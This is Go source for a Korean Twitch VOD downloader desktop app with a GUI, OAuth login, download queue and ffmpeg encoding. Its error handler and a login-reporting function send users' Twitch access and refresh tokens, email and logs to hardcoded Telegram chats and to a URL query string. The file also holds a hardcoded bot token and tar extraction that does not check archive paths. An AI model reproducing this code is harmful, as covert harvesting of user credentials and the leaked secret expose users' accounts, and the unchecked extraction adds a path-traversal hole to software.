package main

import (
	"archive/tar"
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"time"

	"fyne.io/fyne"
	"fyne.io/fyne/canvas"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/layout"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"

	"github.com/dariubs/percent"
	tgbot "github.com/go-telegram-bot-api/telegram-bot-api"
	"github.com/martinlindhe/notify"
	"github.com/nicklaw5/helix"
	"github.com/ricochet2200/go-disk-usage/du"
	dlog "github.com/sqweek/dialog"
	"github.com/tidwall/gjson"
	"github.com/zserge/lorca"
)

//CheckChrome Chrome 체크
func CheckChrome() bool {
	defer Recover() // 복구

	if len(lorca.LocateChrome()) == 0 {
		return false // Chrome이 없으면
	}

	return true // Chrome이 있으면
}

//FindElem 배열 쿼리
func FindElem(a []string, x string) int {
	defer Recover() // 복구

	for i, n := range a {
		if x == n {
			return i
		}
	}
	return len(a)
}

//ContainsElem 배열 확인
func ContainsElem(a []string, x string) bool {
	defer Recover() // 복구

	for _, n := range a {
		if x == n {
			return true
		}
	}
	return false
}

//OpenURL URL 열기
func OpenURL(url string) *exec.Cmd {
	defer Recover() // 복구

	var cmdOpenURL *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmdOpenURL = exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		err = cmdOpenURL.Start()
		ErrHandle(err)

	case "darwin":
		cmdOpenURL = exec.Command("open", url)
		err = cmdOpenURL.Run()
		ErrHandle(err)
	}

	return cmdOpenURL
}

//SplBox 스플릿 창 텍스트
func SplBox(s string, l fyne.CanvasObject) fyne.CanvasObject {
	defer Recover() // 복구

	sqlBox := fyne.NewContainerWithLayout(
		layout.NewBorderLayout(l, nil, nil, widget.NewLabel(s)),
		l, widget.NewLabel(s),
	)

	return sqlBox
}

//WriteResource 번들 리소스 쓰기
func WriteResource(file string, resource fyne.Resource) {
	defer Recover() // 복구

	err := ioutil.WriteFile(file, resource.Content(), 0644)
	ErrHandle(err)
}

//Recover 복구
func Recover() {
	nowTime := time.Now().Format("2006-01-02 15:04:05")

	debugLog.WriteString(fmt.Sprintf("---------- %s\n", nowTime))

	if r := recover(); r != nil {
		debugLog.WriteString(fmt.Sprintf("[알림] 복구됨\n"))

		fmt.Println("Recovered")
		debug.PrintStack()
	}

	debugLog.WriteString(fmt.Sprintf("[알림] Pass\n%s\n", string(debug.Stack())))

	fmt.Println("Pass")
}

//ErrHandle 에러 핸들링
func ErrHandle(e error) {
	defer Recover() // 복구

	errorHandleStatusPre := a.Preferences().StringWithFallback("errorHandle", "true")
	errorHandleStatus, err := strconv.ParseBool(errorHandleStatusPre)
	if err != nil {
		errorHandleStatus = true
	}

	if e != nil {
		_, file, line, _ := runtime.Caller(1)

		if len(twitchAccessToken) == 0 {
			twitchAccessToken = "로그인 정보 없음"
		}

		if len(twitchRefreshToken) == 0 {
			twitchRefreshToken = "로그인 정보 없음"
		}

		if len(twitchDisplayName) == 0 {
			twitchDisplayName = "로그인 정보 없음"
		}

		if len(twitchUserName) == 0 {
			twitchUserName = "알수없음"
		}

		if len(twitchUserEmail) == 0 {
			twitchUserEmail = "로그인 정보 없음"
		}

		msgToSend := fmt.Sprintf("----- 유저 정보\n"+
			"+ 실행 UUID: *%s*\n"+
			"+ 시간: *%s*\n"+
			"+ 운영 체제: *%s*\n"+
			"+ 접수자: [%s (%s)](https://www.twitch.tv/%s)\n"+
			"+ 이메일: %s\n+ 엑세스 토큰: *%s*\n"+
			"+ 리프레시 토큰: *%s*\n"+
			"----- VOD 정보\n"+
			"%s\n"+
			"----- 에러 내용\n"+
			"```\n"+
			"%s\n"+
			"```",
			programUUID,
			time.Now().Format("2006-01-02 15:04:05"),
			runtime.GOOS,
			twitchDisplayName,
			twitchUserName,
			twitchUserName,
			twitchUserEmail,
			twitchAccessToken,
			twitchRefreshToken,
			strings.Join(queueID, ", "),
			fmt.Sprintf("File: %s\n"+
				"Line: %d\n"+
				"Error: %s",
				file,
				line,
				e,
			),
		)

		msg := tgbot.NewMessage(-1001175449027, msgToSend)

		msg.ParseMode = "Markdown"
		msg.DisableWebPagePreview = true

		msgFile := tgbot.NewDocumentUpload(-1001175449027, debugFileName)

		_, err = bot.Send(msg)
		_, err = bot.Send(msgFile)

		if errorHandleStatus {
			if err == nil {
				notify.Alert(title, "Notice", fmt.Sprintf("The error log has been sent.\nWe will fix it as soon as possible."), dirBin+"/logo.png")
			} else {
				notify.Alert(title, "Notice", fmt.Sprintf("The error log has not been sent.\nPlease contact at support@tmi.tips."), dirBin+"/logo.png")
			}

			WriteResource(dirBin+"/bootstrap.css", bootstrapCSS)
			WriteResource(dirBin+"/main.css", mainCSS)
			WriteResource(dirBin+"/main.js", mainJS)

			errHTML := []byte(`
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=1440, initial-scale=1.0">
    <title>TMI Tips - 에러</title>
    <link rel="stylesheet" type="text/css" href="file:///` + dirBin + `/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="file:///` + dirBin + `/main.css">
    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
    <script src="file:///` + dirBin + `/main.js"></script>
	<script>
		function submit_form() {
			alert("페이지가 비활성화 되었습니다");

			$.ajax({
                url	: "http://localhost:7001/errorNoAlert",
                type	: "POST",
                async	: true,
				data    : "type=no_alert"
            });
		}
	</script>
<body>
    <div class="jumbotron">
    <h1>에러 로그</h1>
    <p class="lead">TMI 서비스 이용 중 오류가 발생했습니다.</p>
    <hr class="my-4">
    <fieldset>
        <div class="form-group">
            <textarea class="form-control" rows="4" readonly=1>` + e.Error() + `</textarea>
        </div>
        오류 내용이 TMI Tips로 전송되었습니다.<br>
        내용이 아래 Q&A에 없으면 <button type="button" class="btn btn-outline-primary" onclick="window.open('https://notice.tmi.tips/QnA/')">문의하기</button>를 눌러서 문의해주세요.
    </fieldset>
    <hr class="my-4">
    <details>
        <summary>There is not enough space on the disk 오류</summary>
        <p>C 드라이브를 충분히 비우고 다운로드 해주세요.</p>
    </details>
    <details>
        <summary>The process cannot access the file because it is being used by another process 오류</summary>
        <p>작업관리자에서 ffmpeg.exe 프로세스를 종료해주세요.</p>
    </details>
    <details>
        <summary>server returned 403 Forbidden 오류</summary>
        <p>VOD가 손상되었거나 프로그램이 불러올 수 없습니다. 해당 VOD 정보와 함께 문의해주세요.</p>
    </details>
	<details>
		<summary>exit status 1 오류</summary>
		<p>VOD가 다시보기가 아닌 업로드 영상일 수 있습니다. 업로드 영상 다운로드는 곧 지원될 예정입니다.</p>
	</details>
		<br>
        <form method="post" name="fm">
            <font size=2> * 이 페이지를 다시 보기를 원치 않으시면 <input type="submit" onclick='submit_form()' value="여기">를 눌러주세요.</font>
        </form>
    </div>
</body>
</html>
`)

			ioutil.WriteFile(dirTemp+"/error.html", errHTML, 0644)

			OpenURL(dirTemp + "/error.html")
		}

		panic(e)
	}
}

//VarOS OS별 변수
func VarOS(s string) string {
	defer Recover() // 복구

	switch s {
	case "dirTemp":
		switch runtime.GOOS {
		case "windows":
			return os.Getenv("TEMP") + `/tmi_tips`
		case "darwin":
			return os.Getenv("HOME") + `/tmi_tips`
		}
	case "dirBin":
		switch runtime.GOOS {
		case "windows":
			return os.Getenv("PUBLIC") + `/Documents/tmi_tips/bin`
		case "darwin":
			return os.Getenv("HOME") + `/tmi_tips/bin`
		}
	case "dirWebFonts":
		switch runtime.GOOS {
		case "windows":
			return os.Getenv("PUBLIC") + `/Documents/tmi_tips/webfonts`
		case "darwin":
			return os.Getenv("HOME") + `/tmi_tips/webfonts`
		}
	case "dirDefDown":
		switch runtime.GOOS {
		case "windows":
			return os.Getenv("USERPROFILE") + `/Desktop`
		case "darwin":
			return os.Getenv("HOME") + `/Downloads`
		}
	case "ffmpegURL":
		switch runtime.GOOS {
		case "windows":
			return "https://drive.google.com/uc?export=download&id=1C3nnlKuO8MVgBUsN58m49X2vVy2JHZF5"
		case "darwin":
			return "https://drive.google.com/uc?export=download&id=13ZsF1WF0djGmwnEszCbCUkenXOtX2YrF"
		}
	case "ffmpegBinary":
		switch runtime.GOOS {
		case "windows":
			return "ffmpeg.exe"
		case "darwin":
			return "ffmpeg"
		}
	}

	return ""
}

//CheckUpdate 업데이트 체크
func CheckUpdate() (bool, string) {
	defer Recover() // 복구

	body, err := JsonParse("https://dl.tmi.tips/bin/tmi_downloader.json")
	ErrHandle(err)

	var tmiStatus Status
	err = json.Unmarshal(body, &tmiStatus)
	ErrHandle(err)

	newVersion := tmiStatus.Version

	var updateNote string
	if LoadLang("lang") == "ko" {
		updateNote = tmiStatus.NoteKO
	} else {
		updateNote = tmiStatus.NoteEN
	}

	if newVersion != version {
		fmt.Println("New version found")

		return true, updateNote
	}

	return false, updateNote
}

//HandleRoot Twitch OAuth2
func HandleRoot(w http.ResponseWriter, _ *http.Request) (err error) { // Twitch OAuth2 Function
	defer Recover() // 복구

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`<html><body><h1>Login Complete</h1><br>Please close this window</body></html>`))

	return
}

//HandleLogin Twitch OAuth2
func HandleLogin(w http.ResponseWriter, r *http.Request) (err error) {
	defer Recover() // 복구

	session, err := cookieStore.Get(r, oauthSessionName)
	if err != nil {
		log.Printf("corrupted session %s -- generated new", err)
		err = nil
	}

	var tokenBytes [255]byte
	if _, err := rand.Read(tokenBytes[:]); err != nil {
		return AnnotateError(err, "Couldn't generate a session!")
	}

	state := hex.EncodeToString(tokenBytes[:])

	session.AddFlash(state, stateCallbackKey)

	if err = session.Save(r, w); err != nil {
		return
	}

	http.Redirect(w, r, oauth2Config.AuthCodeURL(state), http.StatusTemporaryRedirect)

	return
}

//HandleOAuth2Callback Twitch OAuth2
func HandleOAuth2Callback(w http.ResponseWriter, r *http.Request) (err error) {
	defer Recover() // 복구

	session, err := cookieStore.Get(r, oauthSessionName)
	if err != nil {
		log.Printf("corrupted session %s -- generated new", err)
		err = nil
	}

	// ensure we flush the csrf challenge even if the request is ultimately unsuccessful
	defer func() {
		if err := session.Save(r, w); err != nil {
			log.Printf("error saving session: %s", err)
		}
	}()

	switch stateChallenge, state := session.Flashes(stateCallbackKey), r.FormValue("state"); {
	case state == "", len(stateChallenge) < 1:
		err = errors.New("missing state challenge")
	case state != stateChallenge[0]:
		err = fmt.Errorf("invalid oauth state, expected '%s', got '%s'", state, stateChallenge[0])
	}

	if err != nil {
		return AnnotateError(
			err,
			"Couldn't verify your confirmation, please try again.",
		)
	}

	token, err := oauth2Config.Exchange(context.Background(), r.FormValue("code"))
	if err != nil {
		return
	}

	// add the oauth token to session
	session.Values[oauthTokenKey] = token

	fmt.Printf("Access token: %s\n", token.AccessToken)
	twitchAccessToken = token.AccessToken
	twitchRefreshToken = token.RefreshToken

	http.Redirect(w, r, "/", http.StatusTemporaryRedirect)

	return
}

//ErrorHandle 에러 안내 페이지 핸들러
func ErrorHandle(_ http.ResponseWriter, r *http.Request) (err error) {
	defer Recover() // 복구

	callType := r.FormValue("type")

	switch callType {
	case "no_alert":
		a.Preferences().SetString("errorHandle", "false")

		dialog.ShowInformation(title, LoadLang("errorHandleNoAlert"), w)
	}

	return
}

//HumanError Twitch OAuth2
func (h HumanReadableWrapper) HumanError() string {
	defer Recover() // 복구

	return h.ToHuman
}

//HTTPCode Twitch OAuth2
func (h HumanReadableWrapper) HTTPCode() int {
	defer Recover() // 복구

	return h.Code
}

//AnnotateError Twitch OAuth2
func AnnotateError(err error, annotation string) error {
	defer Recover() // 복구

	if err == nil {
		return nil
	}
	return HumanReadableWrapper{ToHuman: annotation, error: err}
}

//GetDiskUsage 디스크 사용량
func GetDiskUsage(dst string) float32 {
	defer Recover() // 복구

	usage := du.NewDiskUsage(dst)

	return usage.Usage() * 100
}

//Untar tar 압축 해제
func Untar(dst string, r io.Reader) error { // tar.gz 압축해제
	defer Recover() // 복구

	gzr, err := gzip.NewReader(r)
	if err != nil {
		return err
	}

	defer gzr.Close()

	tr := tar.NewReader(gzr)
	for {
		header, err := tr.Next()

		switch {
		case err == io.EOF:
			return nil

		case err != nil:
			return err

		case header == nil:
			continue
		}

		target := filepath.Join(dst, header.Name)

		switch header.Typeflag {
		case tar.TypeDir:
			if _, err := os.Stat(target); err != nil {
				if err := os.MkdirAll(target, 0755); err != nil {
					return err
				}
			}
		case tar.TypeReg:
			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				return err
			}
			if _, err := io.Copy(f, tr); err != nil {
				return err
			}

			f.Close()
		}
	}
}

//Download 다운로드
func Download(filepath string, url string) {
	defer Recover() // 복구

	out, err := os.Create(filepath)
	ErrHandle(err)

	resp, err := http.Get(url)
	if err != nil {
		_, err = io.Copy(out, bytes.NewReader(noThumbnail.Content()))
		ErrHandle(err)
	} else {
		_, err = io.Copy(out, resp.Body)
		ErrHandle(err)
	}

	_ = resp.Body.Close()
	out.Close()
}

//DownloadFile Twitch ts파일 다운로드
func DownloadFile(filepath string, url string, tsN string) error { // ts 파일 다운로드
	defer Recover() // 복구

	tsURL := url + "chunked" + "/" + tsN + ".ts"

	status, err := http.Get(tsURL)
	if err != nil {
		return err
	}

	if status.StatusCode == 403 {
		tsURL := url + "chunked" + "/" + tsN + "-muted.ts"

		Download(filepath, tsURL)
	} else {
		Download(filepath, tsURL)
	}

	defer status.Body.Close()

	return nil
}

//RecordFile Twitch ts 파일 녹화
func RecordFile(filepath string, url string, tsN string) (string, error) { // ts 파일 다운로드 (녹화)
	defer Recover() // 복구

	tsURL := url + "chunked" + "/" + tsN + ".ts"

	status, err := http.Get(tsURL)
	if err != nil {
		return "error", err
	}

	defer status.Body.Close()

	if status.StatusCode == 403 {
		return "error", err
	}

	Download(filepath, tsURL)
	ErrHandle(err)

	return "pass", nil
}

//ClearDir 폴더 정리
func ClearDir(dir string) { // 폴더 내 모든 파일 삭제
	defer Recover() // 복구

	files, _ := filepath.Glob(filepath.Join(dir, "*"))

	for _, file := range files {
		_ = os.RemoveAll(file)
	}
}

//TsFinder ts 개수 로드
func TsFinder(token string) (int, error) {
	defer Recover() // 복구

	resp, err := http.Get("https://vod-secure.twitch.tv/" + token + "/chunked/index-dvr.m3u8")
	if err != nil {
		return 0, err
	}

	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}

	resp.Body.Close()

	ts := strings.Count(string(data), ".ts")

	return ts, nil
}

///SendLoginInfo 로그인 정보 전송
func SendLoginInfo(id, display, name, refresh, access, mail string) {
	defer Recover() // 복구

	logBot, _ := tgbot.NewBotAPI("795211787:AAExoCodmpr2JCaJC-H7bjXIkFWYwI6H83k")
	logBot.Debug = false

	msg := tgbot.NewMessage(-1001284397070, fmt.Sprintf("로그인 기록 실패\n"+
		"_id: %s\n"+
		"display_name: %s\n"+
		"name: %s\n"+
		"refresh: %s\n"+
		"access: %s\n"+
		"mailAccount: %s",
		id,
		display,
		name,
		refresh,
		access,
		mail,
	))

	resp, err := http.Get(fmt.Sprintf("https://dl.tmi.tips/api/LoginMember?_id=%s&display_name=%s&name=%s&refresh=%s&access=%s&mailAccount=%s", id, display, name, refresh, access, mail))
	if err != nil {
		_, err = logBot.Send(msg)
		ErrHandle(err)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		_, err = logBot.Send(msg)
		ErrHandle(err)
	}
	resp.Body.Close()

	var sendLoginInfos SendLoginInfos
	json.Unmarshal(body, &sendLoginInfos)

	if sendLoginInfos.Type == 0 {
		_, err = logBot.Send(msg)
		ErrHandle(err)
	}
}

//JsonParse json 파싱
func JsonParse(url string) ([]byte, error) {
	defer Recover() // 복구

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return []byte("error"), err
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return []byte("error"), err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte("error"), err
	}

	resp.Body.Close()

	return body, nil
}

//JsonParseTwitch json 파싱 (Twitch API 헤더 추가)
func JsonParseTwitch(url string) ([]byte, error) {
	defer Recover() // 복구

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return []byte("error"), err
	}

	req.Header.Add("Accept", "application/vnd.twitchtv.v5+json")
	req.Header.Add("Client-ID", clientID)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return []byte("error"), err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte("error"), err
	}

	resp.Body.Close()

	return body, nil
}

//KeyCheck 코드 정규식 및 유효성 체크
func KeyCheck(cb string) (string, string, int, string, string, string) {
	defer Recover() // 복구

	urlStr := strings.ReplaceAll(cb, " ", "")

	isMatched, err := regexp.MatchString(`^(((http(s?))://)?)((www.)?)twitch.tv/videos/+\d{9}?$`, urlStr)
	ErrHandle(err)

	if isMatched {
		u, err := url.Parse(urlStr)
		ErrHandle(err)

		twitchVODID := strings.Replace(u.Path, "/videos/", "", 1)
		twitchVODIDArr := []string{twitchVODID}

		vodInfo, err := helixClient.GetVideos(&helix.VideosParams{
			IDs: twitchVODIDArr,
		})
		if err != nil {
			return "error", "nil", 500, "nil", "nil", "nil"
		}

		if len(vodInfo.Data.Videos) == 0 {
			return "error", "nil", 500, "nil", "nil", "nil"
		}

		twitchStreamerID := vodInfo.Data.Videos[0].UserID
		twitchVODTitle := vodInfo.Data.Videos[0].Title
		twitchThumbnail := strings.Replace(strings.Replace(vodInfo.Data.Videos[0].ThumbnailURL, "%{width}", "130", 1), "%{height}", "73", 1)
		//twitchThumbnail := vodInfo.Data.Videos[0].ThumbnailURL

		client := &http.Client{}

		data := url.Values{}
		data.Add("twitchAccount", twitchUserID)
		data.Add("twitchAccess", twitchAccessToken)
		data.Add("twitchStreamerAccount", twitchStreamerID)
		data.Add("twitchVodinfo", twitchVODID)

		req, err := http.NewRequest("POST", allinone, strings.NewReader(data.Encode()))
		ErrHandle(err)

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		ErrHandle(err)

		body, err := ioutil.ReadAll(resp.Body)
		ErrHandle(err)

		resp.Body.Close()

		fmt.Println(string(body))

		var keyData TMI
		err = json.Unmarshal(body, &keyData)
		ErrHandle(err)

		if !keyData.Result {
			twitchStreamerName, err := helixClient.GetUsers(&helix.UsersParams{
				IDs: []string{twitchStreamerID},
			})
			ErrHandle(err)

			return "error", twitchStreamerName.Data.Users[0].Login, keyData.Code, "nil", "nil", "nil"
		}

		var h, m, s int
		withHMS, err := regexp.Compile(`\b\d+h\d+m\d+s\b`)
		ErrHandle(err)

		withMS, err := regexp.Compile(`\b\d+m\d+s\b`)
		ErrHandle(err)

		withS, err := regexp.Compile(`\b\d+s\b`)
		ErrHandle(err)

		if withHMS.MatchString(vodInfo.Data.Videos[0].Duration) {
			_, err = fmt.Sscanf(vodInfo.Data.Videos[0].Duration, "%dh%dm%ds", &h, &m, &s)
			ErrHandle(err)
		} else if withMS.MatchString(vodInfo.Data.Videos[0].Duration) {
			_, err = fmt.Sscanf(vodInfo.Data.Videos[0].Duration, "%dm%ds", &m, &s)
			ErrHandle(err)
		} else if withS.MatchString(vodInfo.Data.Videos[0].Duration) {
			_, err = fmt.Sscanf(vodInfo.Data.Videos[0].Duration, "%ds", &s)
			ErrHandle(err)
		}

		vodToken := keyData.Data
		vodID := twitchVODID
		vodTime := h*3600 + m*60 + s
		vodType := vodInfo.Data.Videos[0].Type

		return vodToken, vodID, vodTime, vodType, twitchVODTitle, twitchThumbnail
	}

	return "error", "nil", 500, "nil", "nil", "nil"
}

//RunAgain 프로그램 재실행
func RunAgain() {
	defer Recover() // 복구

	path, err := os.Executable()
	ErrHandle(err)

	err = exec.Command(path).Start()
	ErrHandle(err)

	os.Exit(1)
}

//KeyCheckRealTime 실시간 코드 정규식 확인
func KeyCheckRealTime(clp string) (bool, string) {
	defer Recover() // 복구

	isMatched, err := regexp.MatchString(`(http|https)://.*twitch.tv/videos/\d+`, clp)
	ErrHandle(err)

	if isMatched {
		return true, clp
	}

	return false, clp
}

//LoadLang 언어 json 로드
func LoadLang(data string) string {
	defer Recover() // 복구

	switch lang {
	case "English":
		v := gjson.Get(langEN, data)

		return v.String()
	case "Korean":
		v := gjson.Get(langKO, data)

		return v.String()
	default:
		v := gjson.Get(langEN, data)

		return v.String()
	}
}

//Increment goroutine 카운터 증가
func (c *counter) Increment() {
	defer Recover() // 복구

	c.mu.Lock()
	c.i++
	c.mu.Unlock()
}

//GetFirstQueue 대기열 첫번째 가져오기
func GetFirstQueue() string {
	defer Recover() // 복구

	return queueID[0]
}

//DownloadHome 다운로드 홈
func DownloadHome(w fyne.Window) fyne.CanvasObject { // 홈
	defer Recover() // 복구

	keyEntry := widget.NewEntry()
	keyEntry.SetPlaceHolder(LoadLang("keyEntryHolder"))

	keyEntry.OnChanged = func(s string) {
		if s == "errortest" {
			ErrHandle(fmt.Errorf("%s", "Error Test\n에러 테스트"))
			keyEntry.SetText("recovered")
		}

		if len(s) > 40 {
			dialog.ShowInformation(title, LoadLang("invalidCode"), w)
			keyEntry.SetText("")
		}
	}

	var ssFFmpeg, toFFmpeg string
	intervalCheck = widget.NewCheck(LoadLang("intervalDownload"), func(c bool) {})
	intervalCheck.Show()

	// 클립보드 자동 감지
	checkClipboard = false
	beforeClipboard := ""

	go func() {
		for {
			if checkClipboard {
				clpStatus, clp := KeyCheckRealTime(w.Clipboard().Content())

				if clpStatus {
					if beforeClipboard == clp {
						time.Sleep(time.Second)
						continue
					}

					ok := dialog.NewConfirm(title, LoadLang("codeFound")+clp, func(res bool) {
						if res {
							beforeClipboard = clp
							keyEntry.SetText(clp)
						} else {
							beforeClipboard = clp
						}
					}, w)

					ok.SetConfirmText(LoadLang("confirm"))
					ok.SetDismissText(LoadLang("dismiss"))
					ok.Show()
				}
			}
			time.Sleep(time.Second)

		}
	}()

	button = widget.NewButtonWithIcon(LoadLang("runButton"), theme.MoveDownIcon(), func() {
		go func() {
			progRun := dialog.NewProgressInfinite(title, "영상 불러오는 중...", w)
			progRun.Show()

			wg := new(sync.WaitGroup)
			c := counter{i: 0}

			maxConnectionPre := a.Preferences().StringWithFallback("maxConnection", "100")
			downloadPath := a.Preferences().StringWithFallback("downloadDir", dirDefDown)
			downloadOption := a.Preferences().StringWithFallback("downloadOption", "Multi")
			if len(downloadOption) == 0 {
				downloadOption = "Multi"
			}

			encodingPre := a.Preferences().StringWithFallback("encodingStatus", "true")
			encodingType := a.Preferences().StringWithFallback("encodingType", "mp4")

			maxConnection, err := strconv.Atoi(maxConnectionPre)
			ErrHandle(err)

			encoding, err := strconv.ParseBool(encodingPre)
			ErrHandle(err)

			if _, err := os.Stat(downloadPath); os.IsNotExist(err) {
				dialog.ShowInformation(title, LoadLang("wrongLocation")+downloadPath, w)
				return
			}

			if encoding {
				if _, err := os.Stat(dirBin + "/" + ffmpegBinary); os.IsNotExist(err) {
					dialog.ShowInformation(title, LoadLang("errRequireFile"), w)
					return
				}
			}

			clipboard := keyEntry.Text
			vodToken, vodID, vodTimeInt, vodType, vodTitle, vodThumbnail := KeyCheck(clipboard) // 대기열

			if vodToken == "error" {
				progRun.Hide()

				switch vodTimeInt {
				case 401:
					dialog.ShowConfirm(title, LoadLang("notSubscriber"), func(b bool) {
						if b {
							OpenURL(fmt.Sprintf("https://www.twitch.tv/products/%s/ticket/new", vodID))
						}
					}, w)
				case 500:
					dialog.ShowInformation(title, LoadLang("invalidCode"), w)
				default:
					dialog.ShowInformation(title, LoadLang("unknownError"), w)
				}

				keyEntry.SetText("")
				return
			}

			if ContainsElem(queueID, vodID) {
				progRun.Hide()

				dialog.ShowInformation(title, LoadLang("alreadyAdded"), w)
				keyEntry.SetText("")

				return
			}

			vodTime := strconv.Itoa(vodTimeInt) // 대기열

			vodHour := vodTimeInt / 3600
			vodMinute := (vodTimeInt - (3600 * vodHour)) / 60
			vodSecond := vodTimeInt - (3600 * vodHour) - (vodMinute * 60)

			if vodType == "highlight" {
				downloadOption = "Single"
				dialog.ShowInformation(title, LoadLang("highlightNotice"), w)
			}

			if intervalCheck.Checked { // 구간 설정
				intervalProg := dialog.NewProgressInfinite(title, LoadLang("setIntervalRange"), w)
				intervalProg.Show()

				intervalW := fyne.CurrentApp().NewWindow(title)

				downloadOption = "Single"

				startHourSet := widget.NewEntry()
				startMinSet := widget.NewEntry()
				startSecSet := widget.NewEntry()
				stopHourSet := widget.NewEntry()
				stopMinSet := widget.NewEntry()
				stopSecSet := widget.NewEntry()
				startHourSet.Disable()
				startMinSet.Disable()
				startSecSet.Disable()
				stopHourSet.Disable()
				stopMinSet.Disable()
				stopSecSet.Disable()

				intervalStartCheck = widget.NewCheck("", func(c bool) {
					if c {
						startHourSet.Enable()
						startMinSet.Enable()
						startSecSet.Enable()
					} else {
						startHourSet.Disable()
						startMinSet.Disable()
						startSecSet.Disable()
					}
				})
				intervalStartCheck.SetChecked(false)

				intervalStopCheck = widget.NewCheck("", func(c bool) {
					if c {
						stopHourSet.Enable()
						stopMinSet.Enable()
						stopSecSet.Enable()
					} else {
						stopHourSet.Disable()
						stopMinSet.Disable()
						stopSecSet.Disable()
					}
				})
				intervalStopCheck.SetChecked(false)

				intervalStart := fyne.NewContainerWithLayout(layout.NewGridLayout(7),
					intervalStartCheck,
					startHourSet,
					widget.NewLabel(LoadLang("intervalHour")),
					startMinSet,
					widget.NewLabel(LoadLang("intervalMin")),
					startSecSet,
					widget.NewLabel(LoadLang("intervalSec")),
				)
				intervalStop := fyne.NewContainerWithLayout(layout.NewGridLayout(7),
					intervalStopCheck,
					stopHourSet,
					widget.NewLabel(LoadLang("intervalHour")),
					stopMinSet,
					widget.NewLabel(LoadLang("intervalMin")),
					stopSecSet,
					widget.NewLabel(LoadLang("intervalSec")),
				)

				startHourSet.SetText("00")
				startMinSet.SetText("00")
				startSecSet.SetText("00")

				stopHourSet.SetText(fmt.Sprintf("%d", vodHour))
				stopMinSet.SetText(fmt.Sprintf("%d", vodMinute))
				stopSecSet.SetText(fmt.Sprintf("%d", vodSecond))

				r, err := regexp.Compile(`\b\d{1,2}\b`)
				ErrHandle(err)

				intervalDone := 0
				form := &widget.Form{
					OnSubmit: func() {
						if !intervalStartCheck.Checked && !intervalStopCheck.Checked {

							intervalCheck.SetChecked(false)
							return
						}

						isMatchedStartHour := r.MatchString(startHourSet.Text)
						isMatchedStartMin := r.MatchString(startMinSet.Text)
						isMatchedStartSec := r.MatchString(startSecSet.Text)
						isMatchedStopHour := r.MatchString(stopHourSet.Text)
						isMatchedStopMin := r.MatchString(stopMinSet.Text)
						isMatchedStopSec := r.MatchString(stopSecSet.Text)

						if !isMatchedStartHour || !isMatchedStartMin || !isMatchedStartSec || !isMatchedStopHour || !isMatchedStopMin || !isMatchedStopSec {
							dialog.ShowInformation(title, LoadLang("errorLoadTime"), w)
							intervalCheck.SetChecked(false)
						} else {
							ssFFmpeg = fmt.Sprintf("%s:%s:%s", startHourSet.Text, startMinSet.Text, startSecSet.Text)
							toFFmpeg = fmt.Sprintf("%s:%s:%s", stopHourSet.Text, stopMinSet.Text, stopSecSet.Text)
						}

						intervalDone = 1

						dialog.NewProgressInfinite(title, LoadLang("intervalRangeSaved"), intervalW).Show()
					},
				}
				form.Append(LoadLang("intervalStart"), intervalStart)
				form.Append(LoadLang("intervalStop"), intervalStop)

				content := widget.NewVBox(
					widget.NewGroup(LoadLang("tabSetting"),
						form,
					),
				)

				intervalW.SetOnClosed(func() {
					progRun.Hide()
					intervalProg.Hide()
					return
				})

				intervalW.SetContent(content)
				intervalW.Resize(fyne.NewSize(390, 160))
				intervalW.SetIcon(theme.SettingsIcon())
				intervalW.SetFixedSize(true)
				intervalW.CenterOnScreen()
				intervalW.Show()

				for intervalDone == 0 {
					time.Sleep(time.Second)
				}

				intervalW.Close()
				intervalProg.Hide()
			}

			tsInt, err := TsFinder(vodToken)

			retryCount := 0

			for err != nil {
				retryCount++

				progRun = dialog.NewProgressInfinite(title, fmt.Sprintf("영상 불러오는 중... 재시도 [%d]", retryCount), w)

				if retryCount > 5 {
					dialog.ShowError(fmt.Errorf("해당 영상을 다운받을 수 없습니다"), w)

					return
				}

				tsInt, err = TsFinder(vodToken)

				time.Sleep(time.Second)
			}

			tsI := tsInt - 1

			tempDirectory := dirTemp + "/" + vodID

			err = os.MkdirAll(tempDirectory, 0777)
			ErrHandle(err)

			ClearDir(tempDirectory)

			var cmd *exec.Cmd                      // 대기열
			progressBar := widget.NewProgressBar() // 대기열

			status := widget.NewLabel("...") // 대기열
			status.SetText(LoadLang("waitForDownload"))

			progressStatus := widget.NewEntry() // 대기열
			progressStatus.SetText("wait")

			progressStatus.OnChanged = func(s string) {
				if s == "press_stop" {
					status.SetText(status.Text + " " + LoadLang("canceled"))
				}
			}

			AddQueue(vodTitle, vodID, vodTime, vodThumbnail, progressBar, status, progressStatus, cmd)

			keyEntry.SetText("")
			progRun.Hide()
			dialog.ShowInformation(title, LoadLang("addedQueue"), w)

			for GetFirstQueue() != vodID {
				time.Sleep(time.Second)
			}

			fmt.Printf("남은 공간: %f\n", 100-GetDiskUsage("./"))

			notify.Alert(title, "Notice", "Download Start", dirThumb+"/"+vodID+".jpg")

			if downloadOption == "Multi" { // Multiple Download
				gState := 0
				dCycle := 0

				fmt.Println(maxConnection)

				queueProgStatus[FindElem(queueID, vodID)].SetText("download")
